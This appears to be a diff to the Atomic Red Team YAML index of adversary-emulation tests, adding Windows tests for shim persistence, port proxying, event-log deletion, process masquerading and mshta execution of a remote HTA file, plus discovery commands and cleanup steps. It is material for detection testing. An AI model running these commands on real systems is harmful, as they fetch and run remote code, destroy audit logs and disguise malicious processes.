@@ -724,6 +724,36 @@ persistence:
         command: |
           sdbinst.exe #{file_path}
           sdbinst.exe -u #{file_path}
+    - name: New shim database files created in the default shim database directory
+      description: 'https://www.fireeye.com/blog/threat-research/2017/05/fin7-shim-databases-persistence.html
+
+'
+      supported_platforms:
+      - windows
+      executor:
+        name: powershell
+        elevation_required: true
+        command: |
+          Copy-Item $PathToAtomicsFolder\T1138\bin\T1138CompatDatabase.sdb C:\Windows\apppatch\Custom\T1138CompatDatabase.sdb
+          Copy-Item $PathToAtomicsFolder\T1138\bin\T1138CompatDatabase.sdb C:\Windows\apppatch\Custom\Custom64\T1138CompatDatabase.sdb
+        cleanup_command: |
+          Remove-Item C:\Windows\apppatch\Custom\T1138CompatDatabase.sdb
+          Remove-Item C:\Windows\apppatch\Custom\Custom64\T1138CompatDatabase.sdb
+    - name: Registry key creation and/or modification events for SDB
+      description: 'https://www.fireeye.com/blog/threat-research/2017/05/fin7-shim-databases-persistence.html
+
+'
+      supported_platforms:
+      - windows
+      executor:
+        name: powershell
+        elevation_required: true
+        command: |
+          New-ItemProperty -Path HKLM:"\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Custom" -Name "AtomicRedTeamT1138" -Value "AtomicRedTeamT1138"
+          New-ItemProperty -Path HKLM:"\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\InstalledSDB" -Name "AtomicRedTeamT1138" -Value "AtomicRedTeamT1138"
+        cleanup_command: |
+          Remove-ItemProperty -Path HKLM:"\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Custom" -Name "AtomicRedTeamT1138"
+          Remove-ItemProperty -Path HKLM:"\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\InstalledSDB" -Name "AtomicRedTeamT1138"
   T1197:
     technique:
       x_mitre_data_sources:
@@ -3028,6 +3058,7 @@ persistence:
         command: |
           sc.exe create #{service_name} binPath= #{binary_path}
           sc.exe start #{service_name}
+        cleanup_command: |
           sc.exe stop #{service_name}
           sc.exe delete #{service_name}
     - name: Service Installation PowerShell Installs A Local Service using PowerShell
@@ -3051,6 +3082,7 @@ persistence:
         command: |
           New-Service -Name "#{service_name}" -BinaryPathName "#{binary_path}"
           Start-Service -Name "#{service_name}"
+        cleanup_command: |
           Stop-Service -Name "#{service_name}"
           (Get-WmiObject Win32_Service -filter "name='#{service_name}'").Delete()
   T1137:
@@ -5891,9 +5923,39 @@ defense-evasion:
         command: 'export #{proxy_scheme}_proxy=#{proxy_server}
 
 '
-        cleanup_command: |-
+        cleanup_command: |
           unset http_proxy
           unset https_proxy
+    - name: portproxy reg key
+      description: |
+        Adds a registry key to set up a proxy on the endpoint at
+        HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\PortProxy\v4tov4
+      supported_platforms:
+      - windows
+      input_arguments:
+        listenport:
+          description: Specifies the IPv4 port, by port number or service name, on
+            which to listen.
+          type: string
+          default: 1337
+        connectport:
+          description: Specifies the IPv4 port, by port number or service name, to
+            which to connect. If connectport is not specified, the default is the
+            value of listenport on the local computer.
+          type: string
+          default: 1337
+        connectaddress:
+          description: Specifies the IPv4 address to which to connect. Acceptable
+            values are IP address, computer NetBIOS name, or computer DNS name. If
+            an address is not specified, the default is the local computer.
+          type: string
+          default: 127.0.0.1
+      executor:
+        name: powershell
+        elevation_required: true
+        command: netsh interface portproxy add v4tov4 listenport=#{listenport} connectport=#{connectport}
+          connectaddress=#{connectaddress}
+        cleanup_command: netsh interface portproxy delete v4tov4 listenport=#{listenport}
   T1196:
     technique:
       x_mitre_permissions_required:
@@ -7968,7 +8030,38 @@ defense-evasion:
           default: "/var/log/secure"
       executor:
         name: bash
-        command: 'echo 0> #{log_path}'
+        command: 'echo 0> #{log_path}
+
+'
+    - name: Delete System Logs Using PowerShell
+      description: 'Recommended Detection: Monitor for use of the windows event log
+        filepath in PowerShell couple with delete arguments
+
+'
+      supported_platforms:
+      - windows
+      executor:
+        name: powershell
+        elevation_required: true
+        command: |
+          $eventLogId = Get-WmiObject -Class Win32_Service -Filter "Name LIKE 'EventLog'" | Select-Object -ExpandProperty ProcessId
+          Stop-Process -Id $eventLogId -Force
+          Remove-Item C:\Windows\System32\winevt\Logs\Security.evtx
+        cleanup_command: 'Start-Service -Name EventLog
+
+'
+    - name: Delete System Logs Using Clear-EventLogId
+      description: 'Clear event logs using built-in PowerShell commands
+
+'
+      supported_platforms:
+      - windows
+      executor:
+        name: powershell
+        elevation_required: true
+        command: 'Clear-EventLog -logname Application
+
+'
   T1202:
     technique:
       x_mitre_data_sources:
@@ -8540,6 +8633,73 @@ defense-evasion:
         cleanup_command: 'del /Q /F %APPDATA%\taskhostw.exe
 
 '
+    - name: Masquerading - non-windows exe running as windows exe
+      description: 'Copies an exe, renames it as a windows exe, and launches it to
+        masquerade as a real windows exe
+
+'
+      supported_platforms:
+      - windows
+      input_arguments:
+        inputfile:
+          description: path of file to copy
+          type: path
+          default: "$PathToAtomicsFolder\\T1036\\bin\\t1036.exe"
+        outputfile:
+          description: path of file to execute
+          type: path
+          default: ($env:TEMP + "\svchost.exe")
+      executor:
+        name: powershell
+        elevation_required: false
+        command: |
+          copy #{inputfile} #{outputfile}
+          $myT1036 = (Start-Process -PassThru -FilePath #{outputfile}).Id
+          Stop-Process -ID $myT1036
+        cleanup_command: 'del #{outputfile}
+
+'
+    - name: Masquerading - windows exe running as different windows exe
+      description: 'Copies a windows exe, renames it as another windows exe, and launches
+        it to masquerade as second windows exe
+
+'
+      supported_platforms:
+      - windows
+      input_arguments:
+        inputfile:
+          description: path of file to copy
+          type: path
+          default: "$env:ComSpec"
+        outputfile:
+          description: path of file to execute
+          type: path
+          default: ($env:TEMP + "\svchost.exe")
+      executor:
+        name: powershell
+        elevation_required: false
+        command: |
+          copy #{inputfile} #{outputfile}
+          $myT1036 = (Start-Process -PassThru -FilePath #{outputfile}).Id
+          Stop-Process -ID $myT1036
+        cleanup_command: 'del #{outputfile}
+
+'
+    - name: Malicious process Masquerading as LSM.exe
+      description: |
+        Detect LSM running from an incorrect directory and an incorrect service account
+        This works by copying cmd.exe to a file, naming it lsm.exe, then copying a file to the C:\ folder.
+      supported_platforms:
+      - windows
+      executor:
+        name: command_prompt
+        elevation_required: true
+        command: |
+          copy C:\Windows\System32\cmd.exe C:\lsm.exe
+          C:\lsm.exe /c echo T1036 > C:\T1036.txt
+        cleanup_command: |
+          del C:\T1036.txt
+          del C:\lsm.exe
   T1112:
     technique:
       x_mitre_data_sources:
@@ -8863,7 +9023,23 @@ defense-evasion:
       executor:
         name: command_prompt
         command: 'mshta vbscript:Execute("CreateObject(""Wscript.Shell"").Run ""powershell
-          -noexit -file #{atomics_path}\T1170\src\powershell.ps1"":close")'
+          -noexit -file #{atomics_path}\T1170\src\powershell.ps1"":close")
+
+'
+    - name: Mshta Executes Remote HTML Application (HTA)
+      description: 'Execute an arbitrary remote HTA.
+
+'
+      supported_platforms:
+      - windows
+      input_arguments:
+        hta_url:
+          description: URL to HTA file for execution
+          type: string
+          default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1170/T1170.hta
+      executor:
+        name: command_prompt
+        command: 'mshta #{hta_url}'
   T1096:
     technique:
       x_mitre_data_sources:
@@ -11620,6 +11796,36 @@ privilege-escalation:
         command: |
           sdbinst.exe #{file_path}
           sdbinst.exe -u #{file_path}
+    - name: New shim database files created in the default shim database directory
+      description: 'https://www.fireeye.com/blog/threat-research/2017/05/fin7-shim-databases-persistence.html
+
+'
+      supported_platforms:
+      - windows
+      executor:
+        name: powershell
+        elevation_required: true
+        command: |
+          Copy-Item $PathToAtomicsFolder\T1138\bin\T1138CompatDatabase.sdb C:\Windows\apppatch\Custom\T1138CompatDatabase.sdb
+          Copy-Item $PathToAtomicsFolder\T1138\bin\T1138CompatDatabase.sdb C:\Windows\apppatch\Custom\Custom64\T1138CompatDatabase.sdb
+        cleanup_command: |
+          Remove-Item C:\Windows\apppatch\Custom\T1138CompatDatabase.sdb
+          Remove-Item C:\Windows\apppatch\Custom\Custom64\T1138CompatDatabase.sdb
+    - name: Registry key creation and/or modification events for SDB
+      description: 'https://www.fireeye.com/blog/threat-research/2017/05/fin7-shim-databases-persistence.html
+
+'
+      supported_platforms:
+      - windows
+      executor:
+        name: powershell
+        elevation_required: true
+        command: |
+          New-ItemProperty -Path HKLM:"\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Custom" -Name "AtomicRedTeamT1138" -Value "AtomicRedTeamT1138"
+          New-ItemProperty -Path HKLM:"\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\InstalledSDB" -Name "AtomicRedTeamT1138" -Value "AtomicRedTeamT1138"
+        cleanup_command: |
+          Remove-ItemProperty -Path HKLM:"\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Custom" -Name "AtomicRedTeamT1138"
+          Remove-ItemProperty -Path HKLM:"\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\InstalledSDB" -Name "AtomicRedTeamT1138"
   T1088:
     technique:
       x_mitre_data_sources:
@@ -12373,6 +12579,7 @@ privilege-escalation:
         command: |
           sc.exe create #{service_name} binPath= #{binary_path}
           sc.exe start #{service_name}
+        cleanup_command: |
           sc.exe stop #{service_name}
           sc.exe delete #{service_name}
     - name: Service Installation PowerShell Installs A Local Service using PowerShell
@@ -12396,6 +12603,7 @@ privilege-escalation:
         command: |
           New-Service -Name "#{service_name}" -BinaryPathName "#{binary_path}"
           Start-Service -Name "#{service_name}"
+        cleanup_command: |
           Stop-Service -Name "#{service_name}"
           (Get-WmiObject Win32_Service -filter "name='#{service_name}'").Delete()
   T1150:
@@ -13909,6 +14117,9 @@ impact:
         command: 'sc.exe stop #{service_name}
 
 '
+        cleanup_command: 'sc.exe start #{service_name}
+
+'
     - name: Windows - Stop service using net.exe
       description: 'Stops a specified service using the net.exe command.
 
@@ -13926,6 +14137,9 @@ impact:
         command: 'net.exe stop #{service_name}
 
 '
+        cleanup_command: 'net.exe start #{service_name}
+
+'
     - name: Windows - Stop service by killing process
       description: "Stops a specified service killng the service's process. \nThis
         technique was used by WannaCry.\n"
@@ -13935,7 +14149,7 @@ impact:
         process_name:
           description: Name of a process to kill
           type: String
-          default: sqlwriter.exe
+          default: spoolsv.exe
       executor:
         name: command_prompt
         elevation_required: false
@@ -15431,6 +15645,48 @@ discovery:
       modified: '2019-10-18T20:37:17.043Z'
       identifier: T1069
     atomic_tests:
+    - name: Permission Groups Discovery
+      description: 'Permission Groups Discovery
+
+'
+      supported_platforms:
+      - macos
+      - linux
+      executor:
+        name: sh
+        command: |
+          dscacheutil -q group
+          dscl . -list /Groups
+          groups
+    - name: Basic Permission Groups Discovery Windows
+      description: 'Basic Permission Groups Discovery for Windows
+
+'
+      supported_platforms:
+      - windows
+      executor:
+        name: command_prompt
+        elevation_required: false
+        command: |
+          net localgroup
+          net group /domain
+    - name: Permission Groups Discovery PowerShell
+      description: 'Permission Groups Discovery utilizing PowerShell
+
+'
+      supported_platforms:
+      - windows
+      input_arguments:
+        user:
+          description: User to identify what groups a user is a member of
+          type: string
+          default: administrator
+      executor:
+        name: powershell
+        elevation_required: false
+        command: |
+          get-localgroup
+          get-ADPrinicipalGroupMembership #{user} | select name
     - name: Elevated group enumeration using net group
       description: 'Runs ''net group'' command including command aliases and loose
         typing to simulate enumeration/discovery of high value domain groups
@@ -19314,7 +19570,23 @@ execution:
       executor:
         name: command_prompt
         command: 'mshta vbscript:Execute("CreateObject(""Wscript.Shell"").Run ""powershell
-          -noexit -file #{atomics_path}\T1170\src\powershell.ps1"":close")'
+          -noexit -file #{atomics_path}\T1170\src\powershell.ps1"":close")
+
+'
+    - name: Mshta Executes Remote HTML Application (HTA)
+      description: 'Execute an arbitrary remote HTA.
+
+'
+      supported_platforms:
+      - windows
+      input_arguments:
+        hta_url:
+          description: URL to HTA file for execution
+          type: string
+          default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1170/T1170.hta
+      executor:
+        name: command_prompt
+        command: 'mshta #{hta_url}'
   T1086:
     technique:
       x_mitre_permissions_required:
@@ -19615,15 +19887,15 @@ execution:
       supported_platforms:
       - windows
       executor:
-        name: command_prompt
+        name: powershell
         elevation_required: false
         command: |
-          REM Encoded payload in next command is the following "Set-Content -path "$env:SystemRoot/Temp/art-marker.txt" -value "Hello from the Atomic Red Team""
+          # Encoded payload in next command is the following "Set-Content -path "$env:SystemRoot/Temp/art-marker.txt" -value "Hello from the Atomic Red Team""
           reg.exe add "HKEY_CURRENT_USER\Software\Classes\AtomicRedTeam" /v ART /t REG_SZ /d "U2V0LUNvbnRlbnQgLXBhdGggIiRlbnY6U3lzdGVtUm9vdC9UZW1wL2FydC1tYXJrZXIudHh0IiAtdmFsdWUgIkhlbGxvIGZyb20gdGhlIEF0b21pYyBSZWQgVGVhbSI="
-          powershell.exe -noprofile -windowstyle hidden -executionpolicy bypass iex ([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String((gp 'HKCU:\Software\Classes\AtomicRedTeam').ART)))
+          iex ([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String((gp 'HKCU:\Software\Classes\AtomicRedTeam').ART)))
         cleanup_command: |
-          del /Q /F %SystemRoot%\Temp\art-marker.txt
-          REG DELETE "HKEY_CURRENT_USER\Software\Classes\AtomicRedTeam" /f
+          cmd /c del /Q /F %SystemRoot%\Temp\art-marker.txt
+          cmd /c REG DELETE "HKEY_CURRENT_USER\Software\Classes\AtomicRedTeam" /f
     - name: PowerShell Downgrade Attack
       description: 'Attempts to run powershell commands in version 2.0 https://www.leeholmes.com/blog/2017/03/17/detecting-and-preventing-powershell-downgrade-attacks/
 
@@ -23871,9 +24143,39 @@ command-and-control:
         command: 'export #{proxy_scheme}_proxy=#{proxy_server}
 
 '
-        cleanup_command: |-
+        cleanup_command: |
           unset http_proxy
           unset https_proxy
+    - name: portproxy reg key
+      description: |
+        Adds a registry key to set up a proxy on the endpoint at
+        HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\PortProxy\v4tov4
+      supported_platforms:
+      - windows
+      input_arguments:
+        listenport:
+          description: Specifies the IPv4 port, by port number or service name, on
+            which to listen.
+          type: string
+          default: 1337
+        connectport:
+          description: Specifies the IPv4 port, by port number or service name, to
+            which to connect. If connectport is not specified, the default is the
+            value of listenport on the local computer.
+          type: string
+          default: 1337
+        connectaddress:
+          description: Specifies the IPv4 address to which to connect. Acceptable
+            values are IP address, computer NetBIOS name, or computer DNS name. If
+            an address is not specified, the default is the local computer.
+          type: string
+          default: 127.0.0.1
+      executor:
+        name: powershell
+        elevation_required: true
+        command: netsh interface portproxy add v4tov4 listenport=#{listenport} connectport=#{connectport}
+          connectaddress=#{connectaddress}
+        cleanup_command: netsh interface portproxy delete v4tov4 listenport=#{listenport}
   T1132:
     technique:
       x_mitre_data_sources:
